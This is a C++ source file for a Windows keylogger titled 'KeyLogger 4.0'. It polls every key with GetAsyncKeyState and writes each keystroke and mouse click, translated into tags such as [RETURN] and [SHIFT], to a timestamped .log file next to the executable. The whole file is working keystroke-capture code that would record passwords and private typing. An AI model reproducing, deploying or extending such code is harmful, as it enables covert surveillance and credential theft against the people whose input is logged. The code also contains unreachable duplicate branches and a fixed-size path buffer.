#include <conio.h>
#include <iostream>
#include<time.h>
#include<windows.h>
#include<string >
#define Extension ".log"
#include<stdio.h>
#include<fstream>
#include<iostream>

using namespace std;
string intToString(int );
string getPath();
string dirBasename(string);

int main()
{
    cout<<"KeyLogger 4.0\n";
    cout<<"Key logger is Started.......\n\n";
    //Path of current working Directory
    string path=dirBasename(getPath());

    //getting time from system
    time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char filename[200];
	char filepath[200];
	//formatting file name
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	sprintf(filepath, "%s\\%s%s", path.c_str(), filename, Extension);
   //file for saving key logger's Data
    ofstream kout(filepath);
    while(1)
    {
        for(unsigned char c = 1; c < 255; c++)
        {
           SHORT click = GetAsyncKeyState(c);
            //entering in loop when key is pressed
            if(click & 1){
				string out = "";
                    if(c == 1)
                        out = "[LMOUSE]"; // mouse left
                    else if(c == 2)
                        out = "[RMOUSE]"; // mouse right
                    else if(c == 4)
                        out = "[MMOUSE]"; // mouse middle
                    else if(c == 13)
                        out = "[RETURN]";
                    else if(c == 16 || c == 17 || c == 18)
                        out = "";
                    else if(c == 160 || c == 161) // lastc == 16
                        out = "[SHIFT]";
                    else if(c == 162 || c == 163) // lastc == 17
                        out = "[STRG]";
                    else if(c == 164) // lastc == 18
                        out = "[ALT]";
                    else if(c == 165)
                        out = "[ALT GR]";
                    else if(c == 8)
                        out = "[BACKSPACE]";
                    else if(c == 9)
                        out = "[TAB]";
                    else if(c == 27)
                        out = "[ESC]";
                    else if(  c == 33)
                        out = "[PAGE UP]";
                    else if(c == 34)
                        out = "[PAGE DOWN]";
                    else if(c == 35)
                        out = "[HOME]";
                    else if(c == 36)
                        out = "[POS1]";
                    else if(c == 37)
                        out = "[ARROW LEFT]";
                    else if(c == 38)
                        out = "[ARROW UP]";
                    else if(c == 39)
                        out = "[ARROW RIGHT]";
                    else if(c == 40)
                        out = "[ARROW DOWN]";
                    else if(c == 45)
                        out = "[INS]";
                    else if(c == 46)
                        out = "[DEL]";
                    else if((c >= 65 && c <= 90)
					|| (c >= 48 && c <= 57)
					|| c == 32)
                        out = c;

                    else if(c == 91 || c == 92)
                        out = "[WIN]";
                    else if(c >= 96 && c <= 105)
                        out = "[NUM " + intToString(c - 96) + "]";
                    else if(c == 106)
                        out = "[NUM /]";
                    else if(c == 107)
                        out = "[NUM +]";
                    else if(c == 109)
                        out = "[NUM -]";
                    else if(c == 109)
                        out = "[NUM ,]";
                    else if(c >= 112 && c <= 123)
                        out = "[F" + intToString(c - 111) + "]";
                    else if(c == 144)
                        out = "[NUM]";
                    else if(c == 192)
                        out = "[OE]";
                    else if(c == 222)
                        out = "[AE]";
                    else if(c == 186)
                        out = "[UE]";
                    else if(c == 186)
                        out = "+";
                    else if(c == 188)
                        out = ",";
                    else if(c == 189)
                        out = "-";
                    else if(c == 190)
                        out = ".";
                    else if(c == 191)
                        out = "#";
                    else if(c == 226)
                        out = "<";

                    else
                        out = "[KEY \\" + intToString(c) + "]";

                cout<< out<<"\n";

                kout<<out;
                kout.flush();
            }

        }

   }
   kout.close();
}

string intToString(int i){
	char buffer[4];
	itoa(i, buffer, 10);
	return string(buffer);
}
string getPath()
{
    int len=100;
    char pBuf[len];
    int bytes = GetModuleFileName(NULL, pBuf, len);
    if(bytes == 0)
        return "Sorry file path is not Specified";
    else
        return pBuf;

}

string dirBasename(string path){

	if(path.empty())
		return string("");

	if(path.find("\\") == string::npos)
		return path;

	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	size_t pos = path.find_last_of("\\");
	if(pos != string::npos)
		path = path.substr(0, pos);

	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	return path;
}
